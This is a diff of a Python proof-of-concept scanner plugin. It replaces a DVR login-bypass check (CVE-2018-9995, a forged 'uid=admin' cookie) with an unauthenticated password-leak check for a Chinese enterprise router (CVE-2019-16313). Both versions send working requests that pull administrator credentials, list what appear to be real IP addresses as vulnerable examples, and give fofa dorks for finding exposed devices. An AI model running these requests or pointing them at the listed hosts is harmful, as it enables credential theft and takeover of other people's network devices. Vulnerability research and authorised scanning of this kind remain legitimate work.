@@ -17,33 +17,19 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "DVR登录绕过漏洞",                        # 漏洞名称
-        "VulnID" : "CVE-2018-9995",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "DVR",                     # 漏洞应用名称
-        "AppVersion" : """
-            Novo
-            CeNova
-            QSee
-            Pulnix
-            XVR 5 in 1 (title: "XVR Login")
-            Securus, - Security. Never Compromise !! -
-            Night OWL
-            DVR Login
-            HVR Login
-            MDVR Login
-        """,                  # 漏洞应用版本
+        "name" : "蜂网互联 企业级路由器v4.31 密码泄露漏洞",                        # 漏洞名称
+        "VulnID" : "CVE-2019-16313",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "蜂网互联 企业级路由器",                     # 漏洞应用名称
+        "AppVersion" : "v4.31",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。
-            最初由阿根廷研究员发现，
-            通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，
-            DVR将以明文形式响应设备的管理员凭证
+            蜂网互联企业级路由器v4.31存在接口未授权访问，导致攻击者可以是通过此漏洞得到路由器账号密码接管路由器
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            title="DVR login"
+            app="蜂网互联-互联企业级路由器"
         """,                     # fofa搜索语句
-        "example" : "http://78.188.181.221:85",                     # 存在漏洞的演示url，写一个就可以了
+        "example" : "http://222.134.86.166:8989",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
     }
 
@@ -56,13 +42,11 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/device.rsp?opt=user&cmd=list" # url自己按需调整
+        url = self.target + "/action/usermanager.htm" # url自己按需调整
         
 
-        headers = {
-                    # "User-Agent":get_random_ua(),
-                    # "Connection":"close",
-                    "Cookie": "uid=admin",
+        headers = {"User-Agent":get_random_ua(),
+                    "Connection":"close",
                     # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
@@ -71,7 +55,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "{\"result\":" in req.text:#req.status_code == 200 and :
+            if "note" in req.text and "status" in req.text and "pwd" in req.text and "aju" in req.text and req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
